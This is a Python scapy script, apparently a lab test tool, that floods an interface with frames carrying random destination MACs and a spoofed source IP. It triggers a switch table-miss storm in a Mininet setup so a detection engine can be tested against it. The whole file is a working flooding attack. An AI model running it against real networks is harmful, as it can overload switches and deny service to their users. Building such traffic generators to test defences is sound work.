#!/usr/bin/env python3
import argparse
import random
import time

from scapy.all import Ether, IP, UDP, sendp

def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def main():
    """
    This sends Ethernet frames with random destination MACs to initiate a table miss attack storm.
    Our engine should monitor, detect, and mitigate against this attack.
    """
    p = argparse.ArgumentParser(description="Generate a miss-storm style attack (random dst MAC frames).")
    p.add_argument("--iface", required=True, help="Interface to send on (e.g., h3-eth0)")
    p.add_argument("--target", default="10.0.0.1", help="Target IP inside Mininet (default: 10.0.0.1)")
    p.add_argument("--src", default="10.0.0.3", help="Source IP (default: 10.0.0.3)")
    p.add_argument("--pps", type=int, default=2000, help="Packets per second (default: 2000)")
    p.add_argument("--seconds", type=int, default=5, help="Duration seconds (default: 5)")
    p.add_argument("--dport", type=int, default=1234, help="UDP destination port")
    args = p.parse_args()

    total = args.pps * args.seconds
    inter = 1.0 / float(args.pps) if args.pps > 0 else 0

    print(f"[attack] iface={args.iface} target={args.target} src={args.src} pps={args.pps} seconds={args.seconds} total={total}")

    for i in range(total):
        dst = rand_mac()
        pkt = Ether(dst=dst) / IP(dst=args.target, src=args.src) / UDP(dport=args.dport, sport=random.randint(1024, 65535))
        sendp(pkt, iface=args.iface, verbose=0)
        if inter > 0:
            time.sleep(inter)

    print("[attack] done")

if __name__ == "__main__":
    main()